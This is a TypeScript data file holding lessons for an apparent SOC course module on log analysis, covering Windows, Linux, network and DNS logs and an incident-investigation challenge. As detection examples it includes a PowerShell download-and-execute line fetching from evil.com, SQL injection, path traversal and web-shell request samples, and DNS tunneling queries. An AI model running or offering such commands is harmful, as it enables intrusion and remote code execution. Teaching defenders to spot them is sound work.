import { LessonContent } from "../../lessonContent";

export const module3: LessonContent[] = [
  // Module 3: Log Analysis Fundamentals
  {
    id: "3.1",
    courseId: "soc-fundamentals",
    title: "Why Logs Matter in Security",
    content: `
# Why Logs Matter in Security

Logs are the foundation of security operations. Without logs, we're blind to what's happening in our environment. This lesson explains why logs are critical and how they enable detection and investigation.

## The Importance of Logging

> "If a tree falls in a forest and no one is around to hear it, does it make a sound? In cybersecurity, if an attack happens and there's no log, it didn't happen."

### Logs Enable:

1. **Detection** - Identifying malicious activity
2. **Investigation** - Understanding what happened
3. **Forensics** - Reconstructing incidents
4. **Compliance** - Meeting regulatory requirements
5. **Troubleshooting** - Diagnosing issues

## What Gets Logged?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    LOG SOURCES                               │
├──────────────┬──────────────┬──────────────┬───────────────┤
│  Endpoints   │   Network    │   Identity   │  Applications │
├──────────────┼──────────────┼──────────────┼───────────────┤
│ • OS Events  │ • Firewall   │ • Active Dir │ • Web Servers │
│ • Process    │ • IDS/IPS    │ • SSO/SAML   │ • Databases   │
│ • File Ops   │ • Proxy      │ • MFA        │ • Email       │
│ • Registry   │ • DNS        │ • VPN        │ • Cloud SaaS  │
│ • Services   │ • NetFlow    │ • PAM        │ • Custom Apps │
└──────────────┴──────────────┴──────────────┴───────────────┘
\`\`\`

## Log Anatomy

A typical log entry contains:

| Field | Description | Example |
|-------|-------------|---------|
| **Timestamp** | When it happened | 2024-01-15T14:32:05Z |
| **Source** | Where it came from | WKS-USER01 |
| **Event Type** | What type of event | Authentication |
| **Severity** | How important | Warning |
| **Details** | Specific information | User logon failed |
| **User** | Who was involved | jsmith |
| **Target** | What was affected | FileServer01 |

### Log Format Examples

**Windows Event Log (XML):**
\`\`\`xml
<Event>
  <System>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2024-01-15T14:32:05Z"/>
    <Computer>WKS-USER01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">jsmith</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="FailureReason">%%2313</Data>
  </EventData>
</Event>
\`\`\`

**Syslog (Linux):**
\`\`\`
Jan 15 14:32:05 webserver01 sshd[12345]: Failed password for invalid user admin from 192.168.1.100 port 52431 ssh2
\`\`\`

**JSON (Modern Applications):**
\`\`\`json
{
  "timestamp": "2024-01-15T14:32:05Z",
  "level": "warning",
  "service": "auth-service",
  "message": "Login failed",
  "user": "jsmith",
  "source_ip": "192.168.1.100",
  "failure_reason": "invalid_password"
}
\`\`\`

## Log Collection Architecture

\`\`\`
┌──────────────────────────────────────────────────────────────┐
│                         SIEM                                  │
└──────────────────────────┬───────────────────────────────────┘
                           │
            ┌──────────────┼──────────────┐
            │              │              │
     ┌──────┴──────┐ ┌─────┴─────┐ ┌──────┴──────┐
     │ Log Shipper │ │  Syslog   │ │   API/      │
     │  (Agent)    │ │  Server   │ │   Webhook   │
     └──────┬──────┘ └─────┬─────┘ └──────┬──────┘
            │              │              │
     ┌──────┴──────┐ ┌─────┴─────┐ ┌──────┴──────┐
     │  Endpoints  │ │  Network  │ │   Cloud     │
     │             │ │  Devices  │ │   Services  │
     └─────────────┘ └───────────┘ └─────────────┘
\`\`\`

## Common Logging Challenges

### 1. Volume
- Large environments generate billions of events
- Storage and processing costs
- Finding needles in haystacks

### 2. Normalization
- Different formats from different sources
- Field name variations
- Time zone issues

### 3. Coverage Gaps
- Systems not sending logs
- Critical events not logged
- Log forwarding failures

### 4. Retention
- Compliance requirements vary
- Storage limitations
- Incident investigation needs

## Log Quality Indicators

### Good Logging:
✅ Consistent timestamps (UTC preferred)
✅ Unique identifiers
✅ Contextual information
✅ Standardized format
✅ Appropriate verbosity

### Poor Logging:
❌ Missing timestamps
❌ Vague messages
❌ No user/source info
❌ Inconsistent format
❌ Excessive noise

## Security-Critical Logs

### Must-Have Log Sources:

| Priority | Log Source | What It Tells You |
|----------|------------|-------------------|
| Critical | Authentication | Who logged in, failed attempts |
| Critical | Endpoint (EDR) | Process execution, file activity |
| Critical | Firewall | Network connections, blocked traffic |
| High | DNS | Domain lookups, potential C2 |
| High | Proxy | Web traffic, downloads |
| High | Email Gateway | Phishing attempts, malware |
| Medium | DHCP | IP assignments |
| Medium | VPN | Remote access |
    `,
    keyTakeaways: [
      "Logs are the foundation of security detection and investigation",
      "Key log sources include endpoints, network devices, identity systems, and applications",
      "Every log entry should have timestamp, source, event type, and relevant details",
      "Common challenges include volume, normalization, coverage gaps, and retention",
      "Prioritize authentication, endpoint, firewall, DNS, and proxy logs"
    ]
  },
  {
    id: "3.2",
    courseId: "soc-fundamentals",
    title: "Windows Event Log Essentials",
    content: `
# Windows Event Log Essentials

Windows Event Logs are one of the most valuable data sources for SOC analysts. Understanding key Event IDs and their significance is essential for threat detection.

## Windows Event Log Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                  WINDOWS EVENT LOGS                      │
├─────────────┬─────────────┬─────────────┬──────────────┤
│   System    │   Security  │ Application │  Custom Logs  │
├─────────────┼─────────────┼─────────────┼──────────────┤
│ OS Events   │ Logons      │ App Errors  │ PowerShell    │
│ Drivers     │ Privilege   │ Installations│ Sysmon       │
│ Services    │ Object      │ Crashes     │ Application   │
│ Hardware    │ Access      │             │ Specific      │
└─────────────┴─────────────┴─────────────┴──────────────┘
\`\`\`

## Critical Security Event IDs

### Authentication Events

| Event ID | Description | Security Significance |
|----------|-------------|----------------------|
| **4624** | Successful logon | Track who logged in |
| **4625** | Failed logon | Brute force detection |
| **4648** | Explicit credentials | RunAs, lateral movement |
| **4672** | Special privileges assigned | Admin activity |
| **4776** | NTLM authentication | Credential validation |

### Logon Types (Event 4624/4625)

| Type | Name | Meaning |
|------|------|---------|
| 2 | Interactive | Console logon |
| 3 | Network | SMB, network share |
| 4 | Batch | Scheduled task |
| 5 | Service | Service start |
| 7 | Unlock | Workstation unlock |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | Cached credentials |

### Account Management

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| **4720** | User account created | New account (authorized?) |
| **4722** | User account enabled | Disabled account activated |
| **4724** | Password reset attempt | Privilege abuse potential |
| **4728** | User added to security group | Privilege escalation |
| **4732** | User added to local group | Local admin changes |
| **4740** | Account locked out | Brute force indicator |

### Process Execution

| Event ID | Description | Detection Use |
|----------|-------------|---------------|
| **4688** | Process creation | Command line auditing |
| **1** (Sysmon) | Process create | Enhanced process tracking |
| **4689** | Process termination | Process lifecycle |

**Example 4688 Analysis:**
\`\`\`
Event ID: 4688
Process Name: C:\\Windows\\System32\\cmd.exe
Command Line: cmd.exe /c whoami
Creator Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: DOMAIN\\jsmith

Analysis: PowerShell spawned cmd.exe running reconnaissance
\`\`\`

### Object Access & File Activity

| Event ID | Description | Use Case |
|----------|-------------|----------|
| **4663** | Object access attempt | File access monitoring |
| **4656** | Handle requested | Object access intent |
| **4660** | Object deleted | Data destruction |
| **5140** | Network share accessed | Lateral movement |
| **5145** | Share object accessed | File share activity |

### Scheduled Tasks

| Event ID | Description | Detection |
|----------|-------------|-----------|
| **4698** | Scheduled task created | Persistence mechanism |
| **4702** | Scheduled task updated | Task modification |
| **4699** | Scheduled task deleted | Cleanup activity |

### PowerShell Logging

| Event ID | Log | Description |
|----------|-----|-------------|
| **4103** | PowerShell Operational | Module logging |
| **4104** | PowerShell Operational | Script block logging |
| **400/403** | PowerShell | Engine lifecycle |

**Script Block Example:**
\`\`\`powershell
# Suspicious script block content
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
\`\`\`

## Sysmon - Enhanced Windows Logging

Sysmon provides detailed logging beyond native Windows events:

| Event ID | Description |
|----------|-------------|
| 1 | Process creation (with hashes) |
| 3 | Network connection |
| 7 | Image loaded (DLL) |
| 8 | CreateRemoteThread |
| 10 | Process access |
| 11 | File creation |
| 12-14 | Registry events |
| 22 | DNS query |

## Hunting Patterns

### Brute Force Detection
\`\`\`
Event ID: 4625 (Failed logons)
Pattern: Same target, multiple failures
Time: Within short window (minutes)
Threshold: >5 failures in 5 minutes
\`\`\`

### Lateral Movement
\`\`\`
Event ID: 4624 (Successful logon)
Logon Type: 3 (Network) or 10 (RDP)
Pattern: Same account, multiple systems
Correlation: Following 4625 failures
\`\`\`

### Privilege Escalation
\`\`\`
Event IDs: 4728, 4732 (Group membership)
Groups: Administrators, Domain Admins
Pattern: Unexpected additions
Context: Who made the change?
\`\`\`

### Suspicious Process Chains
\`\`\`
Parent: outlook.exe
Child: powershell.exe
Grandchild: cmd.exe → whoami

Analysis: Email client spawning scripting interpreters
Verdict: Likely malicious macro execution
\`\`\`
    `,
    keyTakeaways: [
      "Event IDs 4624/4625 track successful and failed logons with logon types",
      "Event ID 4688 captures process creation with command line details",
      "Account management events (4720, 4728, 4732) reveal privilege changes",
      "PowerShell script block logging (4104) captures executed scripts",
      "Sysmon enhances native logging with process hashes, network connections, and DNS"
    ],
    practicalExercise: {
      title: "Windows Event Log Analysis",
      description: "Analyze a set of Windows Security logs to identify suspicious activity.",
      steps: [
        "Review provided event logs for authentication anomalies",
        "Identify any brute force attempts using Event ID 4625",
        "Track lateral movement using logon type 3 and 10 events",
        "Find privilege escalation through group membership changes",
        "Document findings with timeline and affected systems"
      ]
    }
  },
  {
    id: "3.3",
    courseId: "soc-fundamentals",
    title: "Linux Log Analysis Basics",
    content: `
# Linux Log Analysis Basics

Linux systems generate valuable security logs in various locations. Understanding these logs is essential for detecting threats in Unix/Linux environments.

## Linux Log Locations

\`\`\`
/var/log/
├── auth.log          # Authentication (Debian/Ubuntu)
├── secure            # Authentication (RHEL/CentOS)
├── syslog            # System messages
├── messages          # General system logs
├── kern.log          # Kernel messages
├── dmesg             # Boot/hardware messages
├── cron.log          # Scheduled tasks
├── maillog           # Email server logs
├── httpd/            # Apache logs
│   ├── access_log
│   └── error_log
├── nginx/            # Nginx logs
└── audit/            # Audit framework logs
    └── audit.log
\`\`\`

## Authentication Logs (auth.log/secure)

### Successful SSH Login
\`\`\`
Jan 15 10:23:45 server01 sshd[12345]: Accepted publickey for admin from 192.168.1.50 port 54321 ssh2: RSA SHA256:abc123...
Jan 15 10:23:45 server01 sshd[12345]: pam_unix(sshd:session): session opened for user admin by (uid=0)
\`\`\`

### Failed SSH Login
\`\`\`
Jan 15 10:24:01 server01 sshd[12346]: Failed password for invalid user hacker from 10.0.0.100 port 45678 ssh2
Jan 15 10:24:01 server01 sshd[12346]: Connection closed by invalid user hacker 10.0.0.100 port 45678 [preauth]
\`\`\`

### Brute Force Pattern
\`\`\`
Jan 15 10:25:01 server01 sshd[12347]: Failed password for root from 203.0.113.50 port 12345 ssh2
Jan 15 10:25:02 server01 sshd[12348]: Failed password for root from 203.0.113.50 port 12346 ssh2
Jan 15 10:25:03 server01 sshd[12349]: Failed password for root from 203.0.113.50 port 12347 ssh2
Jan 15 10:25:04 server01 sshd[12350]: Failed password for admin from 203.0.113.50 port 12348 ssh2
\`\`\`

### Sudo Usage
\`\`\`
Jan 15 11:00:00 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
\`\`\`

### User/Group Changes
\`\`\`
Jan 15 12:00:00 server01 useradd[5678]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor
Jan 15 12:00:01 server01 usermod[5679]: add 'backdoor' to group 'sudo'
\`\`\`

## Security-Critical Events

| Event Type | Log File | What to Look For |
|------------|----------|------------------|
| SSH authentication | auth.log/secure | Failed/successful logins |
| Sudo usage | auth.log/secure | Privilege escalation |
| User management | auth.log/secure | useradd, usermod, userdel |
| Cron execution | cron.log, syslog | Scheduled task runs |
| Service changes | syslog, messages | Service start/stop/failure |
| Kernel events | kern.log | Module loading, security |

## Syslog Format

Standard syslog format:
\`\`\`
TIMESTAMP HOSTNAME PROGRAM[PID]: MESSAGE

Jan 15 10:23:45 webserver01 nginx[1234]: 192.168.1.100 - - [15/Jan/2024:10:23:45 +0000] "GET /admin HTTP/1.1" 403 162
\`\`\`

### Syslog Severity Levels

| Level | Name | Description |
|-------|------|-------------|
| 0 | Emergency | System unusable |
| 1 | Alert | Immediate action needed |
| 2 | Critical | Critical conditions |
| 3 | Error | Error conditions |
| 4 | Warning | Warning conditions |
| 5 | Notice | Normal but significant |
| 6 | Info | Informational |
| 7 | Debug | Debug messages |

## Linux Audit Framework

### Auditd Events
\`\`\`
type=SYSCALL msg=audit(1705312800.123:456): arch=c000003e syscall=59 success=yes exit=0 
  a0=7ffd12345678 a1=7ffd12345690 a2=7ffd123456a0 a3=0 items=2 ppid=1234 pid=5678 
  auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 
  exe="/bin/bash" key="exec_monitor"
\`\`\`

### Common Audit Rules
\`\`\`bash
# Monitor file access
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity

# Monitor command execution
-a always,exit -F arch=b64 -S execve -k exec_monitor

# Monitor privilege escalation
-w /usr/bin/sudo -p x -k privilege_escalation
-w /usr/bin/su -p x -k privilege_escalation
\`\`\`

## Web Server Logs

### Apache Access Log
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:30:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."
\`\`\`

### Suspicious Web Activity

**SQL Injection Attempt:**
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:31:00 +0000] "GET /search.php?q=1'+OR+'1'='1 HTTP/1.1" 200 5678
\`\`\`

**Path Traversal:**
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:32:00 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 200 2345
\`\`\`

**Web Shell Access:**
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:33:00 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15
\`\`\`

## Log Analysis Commands

### Essential Commands
\`\`\`bash
# View recent auth failures
grep "Failed password" /var/log/auth.log | tail -20

# Count failures by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Find sudo usage
grep "sudo:" /var/log/auth.log

# Monitor in real-time
tail -f /var/log/auth.log | grep --color "Failed\\|Accepted"

# Search compressed logs
zgrep "pattern" /var/log/auth.log.*.gz
\`\`\`
    `,
    keyTakeaways: [
      "Linux logs are stored in /var/log with auth.log/secure for authentication",
      "SSH logs show accepted/failed connections with source IPs and usernames",
      "Sudo logs capture privilege escalation with full command details",
      "The audit framework provides detailed syscall and file access logging",
      "Web server logs can reveal SQL injection, path traversal, and web shell activity"
    ]
  },
  {
    id: "3.4",
    courseId: "soc-fundamentals",
    title: "Network Device Logs",
    content: `
# Network Device Logs

Network device logs provide visibility into traffic patterns, connection attempts, and potential threats traversing your network. Understanding these logs is essential for detecting lateral movement, C2 communication, and data exfiltration.

## Network Log Sources

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                  NETWORK LOG SOURCES                         │
├───────────────┬───────────────┬───────────────┬─────────────┤
│   Firewall    │     Proxy     │      DNS      │    VPN      │
├───────────────┼───────────────┼───────────────┼─────────────┤
│ Allow/Deny    │ URL requests  │ Lookups       │ Connections │
│ Source/Dest   │ Categories    │ Responses     │ Users       │
│ Ports         │ User-Agent    │ Query types   │ Duration    │
│ Bytes         │ Downloads     │ NXDOMAIN      │ Bandwidth   │
└───────────────┴───────────────┴───────────────┴─────────────┘
\`\`\`

## Firewall Logs

### Log Fields
| Field | Description |
|-------|-------------|
| Timestamp | When the event occurred |
| Source IP | Origin of connection |
| Source Port | Origin port |
| Destination IP | Target of connection |
| Destination Port | Target port (service) |
| Protocol | TCP/UDP/ICMP |
| Action | Allow/Deny/Drop |
| Bytes | Data transferred |
| Rule | Which rule matched |

### Example Firewall Log
\`\`\`
2024-01-15 10:30:00 ALLOW TCP 192.168.1.100:54321 -> 8.8.8.8:443 bytes=1234 rule=outbound-https
2024-01-15 10:30:01 DENY TCP 10.0.0.50:12345 -> 192.168.1.100:22 bytes=0 rule=block-external-ssh
2024-01-15 10:30:02 DENY TCP 203.0.113.100:45678 -> 192.168.1.1:3389 bytes=0 rule=block-rdp-external
\`\`\`

### Suspicious Patterns

**Port Scanning:**
\`\`\`
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:21
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:22
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:23
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:25
... (sequential ports in milliseconds)
\`\`\`

**Beaconing (C2):**
\`\`\`
10:00:00 ALLOW 192.168.1.100 -> 45.33.32.156:443 bytes=256
10:05:00 ALLOW 192.168.1.100 -> 45.33.32.156:443 bytes=256
10:10:00 ALLOW 192.168.1.100 -> 45.33.32.156:443 bytes=256
... (regular intervals, consistent size)
\`\`\`

**Data Exfiltration:**
\`\`\`
10:30:00 ALLOW 192.168.1.100 -> 185.234.72.50:443 bytes=50000000
(Large outbound transfer to unknown destination)
\`\`\`

## Proxy Logs

### Key Fields
| Field | Description |
|-------|-------------|
| User | Authenticated user |
| Source IP | Client IP |
| URL | Full URL requested |
| Domain | Domain only |
| Category | URL category |
| Action | Allow/Block |
| Status Code | HTTP response code |
| Bytes | Downloaded size |
| User-Agent | Browser/client info |

### Example Proxy Log
\`\`\`
2024-01-15 10:30:00 user=jsmith src=192.168.1.100 url="https://github.com/project" 
  category=Technology action=ALLOW status=200 bytes=45678 
  ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
\`\`\`

### Suspicious Indicators

**Malware Download:**
\`\`\`
url="http://suspicious-domain.com/update.exe"
category=Uncategorized
ua="PowerShell/5.1"
\`\`\`

**Encoded Data:**
\`\`\`
url="https://pastebin.com/raw/aB3dE5fG"
(Data exfil via paste sites)
\`\`\`

## DNS Logs

### Query Types
| Type | Description | Security Relevance |
|------|-------------|-------------------|
| A | IPv4 address | Normal lookups |
| AAAA | IPv6 address | Normal lookups |
| MX | Mail server | Email config |
| TXT | Text records | Can hide data |
| CNAME | Alias | Redirections |
| PTR | Reverse lookup | Reconnaissance |

### Example DNS Log
\`\`\`
2024-01-15 10:30:00 client=192.168.1.100 query=github.com type=A response=140.82.121.4
2024-01-15 10:30:01 client=192.168.1.100 query=malware-c2.xyz type=A response=NXDOMAIN
\`\`\`

### DNS Threat Indicators

**Domain Generation Algorithm (DGA):**
\`\`\`
query=asdkjf23.com NXDOMAIN
query=bx8ks92m.com NXDOMAIN
query=c9xnp3lq.com NXDOMAIN
(Random-looking domains, many NXDOMAIN)
\`\`\`

**DNS Tunneling:**
\`\`\`
query=aGVsbG8gd29ybGQ.data.evil.com type=TXT
query=ZXhmaWx0cmF0ZWQgZGF0YQ.data.evil.com type=TXT
(Base64 in subdomain = data exfiltration)
\`\`\`

**Newly Registered Domain:**
\`\`\`
query=totally-legit-bank-login.com
(First seen today, mimics legitimate site)
\`\`\`

## VPN Logs

### Key Fields
| Field | Description |
|-------|-------------|
| Username | Authenticated user |
| Source IP | Client public IP |
| Assigned IP | VPN tunnel IP |
| Connect Time | Session start |
| Duration | Connection length |
| Bytes In/Out | Data transferred |

### Suspicious VPN Patterns

**Impossible Travel:**
\`\`\`
10:00:00 user=jsmith src_ip=New_York connected
10:30:00 user=jsmith src_ip=Moscow connected
(Same user, different continents, 30 min apart)
\`\`\`

**Off-Hours Access:**
\`\`\`
03:00:00 user=cfo src_ip=Unknown_Country connected
(Executive account, unusual time/location)
\`\`\`
    `,
    keyTakeaways: [
      "Firewall logs show allow/deny decisions with source, destination, and ports",
      "Proxy logs provide URL-level visibility with user attribution and categories",
      "DNS logs can reveal DGA domains, tunneling, and malicious lookups",
      "VPN logs track remote access with user, location, and duration details",
      "Look for patterns: scanning, beaconing, impossible travel, and data exfiltration"
    ]
  },
  {
    id: "3.5",
    courseId: "soc-fundamentals",
    title: "Hands-On: Log Analysis Challenge",
    content: `
# Hands-On: Log Analysis Challenge

Put your log analysis skills to the test with this practical challenge. You'll analyze logs from multiple sources to investigate a potential security incident.

## Challenge Scenario

**Background:**
Your SOC received an alert about potential suspicious activity on a workstation (WKS-FIN01) in the Finance department. The user reported their computer was "acting slow" this morning. Your task is to analyze the logs and determine what happened.

## Provided Evidence

### Evidence 1: Windows Security Events

\`\`\`
# Event 1 - Yesterday 18:45:00
EventID: 4625
TargetUserName: admin
WorkstationName: WKS-FIN01
FailureReason: Unknown user name or bad password
SourceNetworkAddress: 192.168.1.50
LogonType: 3

# Event 2 - Yesterday 18:45:01 through 18:52:00 (47 similar events)
EventID: 4625 (repeated 47 times)
TargetUserName: admin, administrator, root, finance, backup
SourceNetworkAddress: 192.168.1.50

# Event 3 - Yesterday 18:53:00
EventID: 4624
TargetUserName: svc_backup
WorkstationName: WKS-FIN01
SourceNetworkAddress: 192.168.1.50
LogonType: 3

# Event 4 - Yesterday 18:55:00
EventID: 4688
NewProcessName: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c whoami
ParentProcessName: C:\\Windows\\System32\\services.exe

# Event 5 - Yesterday 18:56:00
EventID: 4688
NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
ParentProcessName: C:\\Windows\\System32\\cmd.exe
\`\`\`

### Evidence 2: Firewall Logs

\`\`\`
2024-01-14 18:54:00 ALLOW TCP 192.168.10.100:49152 -> 192.168.1.50:445 (WKS-FIN01 to unknown)
2024-01-14 19:00:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=2048
2024-01-14 19:05:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=1024
2024-01-14 19:10:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=1024
2024-01-14 19:15:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=1024
2024-01-14 23:00:00 ALLOW TCP 192.168.10.100:49160 -> 45.33.32.156:443 bytes=50000000
\`\`\`

### Evidence 3: DNS Logs

\`\`\`
2024-01-14 18:59:00 192.168.10.100 query=update-service.net type=A response=45.33.32.156
2024-01-14 19:00:00 192.168.10.100 query=update-service.net type=A response=45.33.32.156
2024-01-15 08:30:00 192.168.10.100 query=update-service.net type=A response=45.33.32.156
\`\`\`

## Analysis Questions

### Question 1: Initial Access
- What type of attack was attempted first?
- Was it successful? What evidence supports this?
- What account was compromised?

### Question 2: Execution
- What commands were executed?
- What is the encoded PowerShell command likely doing?
- What is the parent-child process relationship?

### Question 3: Command & Control
- What IP address is the C2 server?
- What domain resolves to this IP?
- What pattern suggests C2 beaconing?

### Question 4: Data Exfiltration
- Is there evidence of data theft?
- How much data may have been exfiltrated?
- When did this occur?

## Analysis Walkthrough

### Step 1: Timeline Construction

\`\`\`
18:45:00 - Brute force attack begins from 192.168.1.50
18:52:00 - 47+ failed login attempts
18:53:00 - Successful login with svc_backup account (Type 3 = Network)
18:55:00 - cmd.exe executes whoami (reconnaissance)
18:56:00 - PowerShell with encoded command (malware download?)
18:59:00 - DNS lookup for update-service.net
19:00:00 - First C2 beacon to 45.33.32.156:443
19:05-19:15 - Regular beaconing pattern (every 5 min)
23:00:00 - Large outbound transfer (50MB) - exfiltration
\`\`\`

### Step 2: Attack Chain (MITRE ATT&CK)

| Phase | Technique | Evidence |
|-------|-----------|----------|
| Initial Access | T1110 Brute Force | 47 failed logins |
| Credential Access | T1110.001 Password Guessing | Multiple usernames tried |
| Execution | T1059.001 PowerShell | Encoded PowerShell command |
| Discovery | T1033 System Owner | whoami command |
| C2 | T1071.001 Web Protocols | HTTPS to 45.33.32.156 |
| Exfiltration | T1041 Exfil Over C2 | 50MB transfer at 23:00 |

### Step 3: IOC Extraction

\`\`\`
IP Addresses:
- 192.168.1.50 (Attacker source - internal?)
- 45.33.32.156 (C2 server)

Domains:
- update-service.net

Accounts:
- svc_backup (compromised)

Files/Commands:
- Encoded PowerShell command
- C:\\Windows\\System32\\cmd.exe
\`\`\`

## Your Report

**Incident Summary:**
[Write a brief summary of what happened]

**Timeline of Events:**
[List key events in chronological order]

**Affected Systems:**
[List compromised systems and accounts]

**Indicators of Compromise:**
[List all IOCs discovered]

**Recommended Actions:**
[What should be done to contain and remediate?]
    `,
    keyTakeaways: [
      "Always build a timeline when analyzing logs from multiple sources",
      "Correlate events across different log sources (Windows, firewall, DNS)",
      "Map observed behaviors to MITRE ATT&CK techniques",
      "Extract IOCs (IPs, domains, hashes, accounts) for blocking and hunting",
      "Document findings in a structured incident report format"
    ],
    practicalExercise: {
      title: "Complete the Log Analysis Challenge",
      description: "Use the provided evidence to fully analyze the incident and create a report.",
      steps: [
        "Build a complete timeline of events",
        "Identify the attack chain using MITRE ATT&CK",
        "Extract all indicators of compromise",
        "Determine the scope of the incident",
        "Write recommended containment and remediation actions"
      ]
    }
  },
  {
    id: "3.5",
    courseId: "soc-fundamentals",
    title: "Log Analysis Challenge Quiz",
    content: `
# Log Analysis Challenge Quiz

Test your ability to analyze Windows and Linux logs for security events.

## Quiz Overview

This quiz covers the log analysis concepts from Module 3:
- Windows Event Logs and key Event IDs
- Linux system and authentication logs
- Log formats and parsing techniques
- Timestamp analysis and correlation
- Identifying suspicious patterns

## Instructions

1. **Duration**: 30 minutes
2. **Questions**: 5 multiple-choice questions
3. **Passing Score**: 75% (4 out of 5 questions)
4. **Attempts**: Unlimited - retake if needed

## Key Topics to Review

Before taking the quiz, make sure you understand:
- Windows Event IDs (4624, 4625, 4768, etc.)
- Linux log files (/var/log/auth.log, /var/log/secure, etc.)
- Common log formats (syslog, JSON, CEF)
- Timestamp analysis and timeline creation
- Suspicious activity indicators in logs
- Log correlation techniques

## Taking the Quiz

Click the "Start Quiz" button below when you're ready. The quiz will cover:
- Windows Event Log interpretation
- Linux log analysis
- Log format identification
- Timeline construction
- Pattern recognition in log data

Good luck! Log analysis is a fundamental skill for SOC analysts.
    `,
    keyTakeaways: [
      "Windows Event IDs provide standardized indicators for security events",
      "Linux authentication logs are crucial for tracking user activity",
      "Timestamp analysis helps establish event timelines and correlations",
      "Pattern recognition in logs enables detection of suspicious activities",
      "Multiple log sources provide comprehensive visibility into security events"
    ],
    practicalExercise: {
      title: "Quiz Preparation",
      description: "Review log analysis concepts before taking the quiz.",
      steps: [
        "Study common Windows Event IDs and their meanings",
        "Review Linux log file locations and formats",
        "Practice timestamp analysis techniques",
        "Learn to identify suspicious log patterns",
        "Take the quiz when ready"
      ]
    }
  }
];
